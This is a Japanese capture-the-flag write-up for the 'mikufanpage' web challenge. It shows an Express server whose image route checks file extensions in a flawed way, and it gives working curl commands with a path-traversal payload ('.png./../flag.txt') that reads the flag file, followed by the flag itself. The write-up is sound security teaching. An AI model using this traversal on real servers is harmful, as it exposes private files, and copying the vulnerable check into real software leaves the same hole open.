# mikufanpage:web:104pts
miku <3 (epilepsy warning)  
[https://mikufanpage.web.osugaming.lol/](https://mikufanpage.web.osugaming.lol/)  

[mikufanpage.zip](mikufanpage.zip)  

# Solution
ソースとURLが渡される。  
アクセスするとmikuのファンページなようだ。  
![site.png](site/site.png)  
配布されたソースを見ると以下のようであった。  
```js
const express = require('express'); 
const path = require('path');
  
const app = express(); 
const PORT = process.env.PORT ?? 3000;

app.use(express.static(path.join(__dirname, 'public')));
  
app.listen(PORT, (err) =>{ 
    if(!err) 
        console.log("mikufanpage running on port "+ PORT) 
    else 
        console.log("Err ", err); 
}); 

app.get("/image", (req, res) => {
    if (req.query.path.split(".")[1] === "png" || req.query.path.split(".")[1] === "jpg") { // only allow images
        res.sendFile(path.resolve('./img/' + req.query.path));
    } else {
        res.status(403).send('Access Denied');
    }
});
```
画像を読み込む際にpathクエリを`.`で分割し、添え字1の値が`png`または`jpg`であるかチェックしている。  
添え字2以降をチェックしていないためトラバーサルできそうだ。  
ソースより、フラグは`./img/flag.txt`にあるとわかる。  
`.png./../flag.txt`のように存在しないディレクトリ`.png.`を与えて、一つ戻ってやればよい。  
以下のように行う。  
```bash
$ curl 'https://mikufanpage.web.osugaming.lol/image?path=.png./satoki'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: ENOENT: no such file or directory, stat &#39;/app/img/.png./satoki&#39;</pre>
</body>
</html>
$ curl 'https://mikufanpage.web.osugaming.lol/image?path=.png./../flag.txt'
osu{miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku}
```
flagが得られた。  

## osu{miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku}